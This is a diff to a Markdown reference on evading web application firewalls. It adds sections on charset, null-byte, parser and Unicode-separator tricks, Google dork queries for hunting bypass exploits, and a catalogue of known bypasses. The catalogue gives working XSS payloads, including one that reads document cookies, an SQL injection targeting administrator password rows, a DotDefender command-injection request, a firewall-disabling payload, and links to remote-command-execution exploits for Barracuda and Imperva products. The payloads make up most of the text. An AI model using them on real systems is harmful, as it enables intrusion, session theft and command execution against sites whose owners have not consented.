@@ -1414,10 +1414,10 @@ Wanna detect WAFs? Lets see how.
     </tr>
 </table>
 
-# Evasion Techniques
+## Evasion Techniques
 Lets look at some methods of bypassing and evading WAFs.
 
-## Fuzzing/Bruteforcing:
+### Fuzzing/Bruteforcing:
 #### Method:  
 Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 - Wordlists specifically for fuzzing - [Seclists Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
@@ -1435,15 +1435,17 @@ __Drawback:__
 - This method often fails. 
 - Many a times your IP will be blocked (temporarily/permanently).
 
-## Regex-Reversing:
-### Method:
+### Regex-Reversing:
+#### Method:
 - Most efficient method of bypassing WAFs.
 - Some WAFs rely upon matching the attack payloads with the signatures in their databases.
 - Payload matches the reg-ex the WAF triggers alarm.
 
 #### Techniques:
 
-__Scenario 1: SQL Injection__
+### __Keyword Filter Detection/Bypass__
+
+__SQL Injection__
 
 ##### • Step 1:
 __Keyword filer__: `and`, `or`, `union`  
@@ -1550,27 +1552,90 @@ script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0
 <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
 ```
 
-## Google Dorks Approach:
-__Method:__
+### Browser Bugs:
+#### Charset Bugs:
+- We can try changing charset header to higher Unicode (eg. UTF-32) and test payloads.
+- When the site decodes the string, the payload gets triggered.
+
+Example request:
+<pre>
+    GET <b>/page.php?param=∀㸀㰀script㸀alert(1)㰀/script㸀</b> HTTP/1.1
+    Host: site.com
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
+    <b>Accept-Charset:utf-32, iso-8859-1;q=0.5</b>
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+</pre>
+When the site loads, it will be encoded to the UTF-32 encoding that we set, and
+then as the output encoding of the page is utf-8, it will be rendered as: `"<script>alert (1) </ script>`.
+
+Final URL encoded payload: `%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80`
+
+#### Null Bytes:
+- The null bytes are commonly used as string terminator.
+- This can help us evade many web application filters in case they are not filtering out the null bytes.
+
+Payload examples:
+```
+<scri%00pt>alert(1);</scri%00pt>
+<scri\x00pt>alert(1);</scri%00pt>
+<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
+```
+
+#### Parsing Bugs:
+- RFC states that NodeNames cannot begin with whitespace.
+- But we can use special chars like ` %`, `//`, `!`, `?`, etc.
+
+Examples:
+- `<// style=x:expression\28write(1)\29>`  - Works upto IE7 _([Source](http://html5sec.org/#71))_
+- `<!--[if]><script>alert(1)</script -->` - Works upto IE9 _([Reference](http://html5sec.org/#115))_
+- `<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>` - Works in IE7 _([Reference](http://html5sec.org/#77))_
+- `<%div%20style=xss:expression(prompt(1))>` - Works Upto IE7
+
+#### Unicode Separators:
+- Every browser has their own specific charset of separators.
+- We can fuzz charset range of `0x00` to `0xFF` and get the set of separators for each browser.  
+
+Here is a compiled list of separators:
+- IExplorer: `0x09`, `0x0B`, `0x0C`, `0x20`, `0x3B`  
+- Chrome: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`  
+- Safari: `0x2C`, `0x3B`  
+- FireFox: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`  
+- Opera: `0x09`, `0x20`, `0x2C`, `0x3B`  
+- Android: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B` 
+
+An exotic payload: 
+```
+<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>pwn3d
+```
+
+### Google Dorks Approach:
+#### Method:
 - There are a lot of known bypasses of various web application firewalls ([see section](#known-bypasses)).
 - With the help of google dorks, we can easily find bypasses.
 
-__Techniques:__  
-Before anything else, its time to [hone up our skills via Google Dorks Cheat Sheet](http://pdf.textfiles.com/security/googlehackers.pdf).
+#### Techniques:  
+Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](http://pdf.textfiles.com/security/googlehackers.pdf).
 - Normal search:  
 `+<wafname> waf bypass`
 
 - Searching for specific version exploits:  
-`"<wafname> <version>" bypass`
+`"<wafname> <version>" (bypass|exploit)`
+
+- For specific type bypass exploits:  
+`"<wafname>" +<bypass type> (bypass|exploit)`
 
 - On [Exploit DB](https://exploit-db.com):  
 `site:exploit-db.com +<wafname> bypass`
 
 - On [0Day Inject0r DB](https://0day.today):  
-`site:0day.today +<wafname> bypass`
+`site:0day.today +<wafname> <type> (bypass|exploit)`
 
 - On [Twitter](https://twitter.com):  
 `site:twitter.com +<wafname> bypass`
+
+- On [Pastebin](https://pastebin.com)  
+`site:pastebin.com +<wafname> bypass`
 
 ## Known Bypasses:
 ### __Cloudflare__ 
@@ -1579,7 +1644,24 @@ Before anything else, its time to [hone up our skills via Google Dorks Cheat She
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
 ```
 
-### __Imperva SecureSphere__ 
+### __Barracuda__ 
+- Cross Site Scripting by [@WAFNinja](https://waf.ninja)
+```
+<body style="height:1000px" onwheel="alert(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+```
+- HTML Injection by [@Global-Evolution](https://www.exploit-db.com/?author=2016)
+```
+GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
+Host: favoritewaf.com
+User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
+```
+- [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
+- [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)
+
+### __Imperva SecureSphere__
+- [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
 - XSS Bypass by [@WAFNinja](https://waf.ninja)
 ```
 %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
@@ -1597,29 +1679,54 @@ Before anything else, its time to [hone up our skills via Google Dorks Cheat She
 ```
 stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
 ```
+- [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)
 
-### __Barracuda__ 
-- Cross Site Scripting by [@WAFNinja](https://waf.ninja)
+### __DotDefender__
+- Firewall disable by (v5.0) by [@hyp3rlinx](http://hyp3rlinx.altervista.org)
 ```
-<body style="height:1000px" onwheel="alert(1)">
-<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
-<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+
+<enabled>false</enabled>
 ```
-- HTML Injection by [@Global-Evolution](https://www.exploit-db.com/?author=2016)
+- Remote Command Execution (v3.8-5) by [@John Dos](https://www.exploit-db.com/?author=1996)
 ```
-GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
-Host: favoritewaf.com
-User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
-```
+POST /dotDefender/index.cgi HTTP/1.1
+Host: 172.16.159.132
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;
+rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Authorization: Basic YWRtaW46
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
 
-### __DotDefender__  
+sitename=dotdefeater&deletesitename=dotdefeater;id;ls -al
+../;pwd;&action=deletesite&linenum=15
+```
+- Persistent XSS (v4.0) by [@EnableSecurity](https://enablesecurity.com)
+```
+GET /c?a=<script> HTTP/1.1
+Host: 172.16.159.132
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;
+rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+<script>alert(1)</script>: aa
+Keep-Alive: 300
+```
 - R-XSS Bypass by [@WAFNinja](https://waf.ninja)
 ```
 <svg/onload=prompt(1);>
 <isindex action="javas&tab;cript:alert(1)" type=image>
 <marquee/onstart=confirm(2)>
 ```
-- GET - XSS Bypass by [@DavidK](https://www.exploit-db.com/?author=2741)
+- GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
 /search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E
 
@@ -1628,11 +1735,15 @@ User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 h%2Bn)(/0wn3d/.source)" />
 ```
 
-- POST - XSS Bypass by [@DavidK](https://www.exploit-db.com/?author=2741)
+- POST - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
 <img src="WTF" onError="{var
 {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/
 .source)" />
+```
+- `clave` XSS (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
+```
+/?&idPais=3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{ 
 ```
 
 ### __Fortinet Fortiweb__
@@ -1845,6 +1956,8 @@ X-Remote-Addr: 127.0.0.1
 - [Protocol Level WAF Evasion](papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
 - [Neural Network based WAF for SQLi](papers/Artificial%20Neural%20Network%20based%20WAF%20for%20SQL%20Injection.pdf) - A paper about building a neural network based WAF for detecting SQLi attacks.
 - [Bypassing Web Application Firewalls with HTTP Parameter Pollution](papers/Bypassing%20Web%20Application%20Firewalls%20with%20HTTP%20Parameter%20Pollution.pdf) - A ressearch paper from [Exploit DB](https://exploit-db.com) about effectively bypassing WAFs via HTTP Parameter Pollution.
+- [Poking A Hole in the Firewall](papers/Poking%20A%20Hole%20In%20The%20Firewall.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about modern firewall analysis and related bypasses.
+- [Modern WAF Fingerprinting and XSS Filter Bypass](papers/Modern%20WAF%20Fingerprinting%20and%20XSS%20Filter%20Bypass.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about WAF fingerprinting and bypassing XSS filters.
 - [WAF Evasion Testing](papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
 - [WASC WAF Evaluation Criteria](papers/WASC%20WAF%20Evaluation%20Criteria.pdf) - A guide for WAF Evaluation from [Web Application Security Consortium](http://www.webappsec.org)
 - [WAF Evaluation and Analysis](papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis.pdf) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
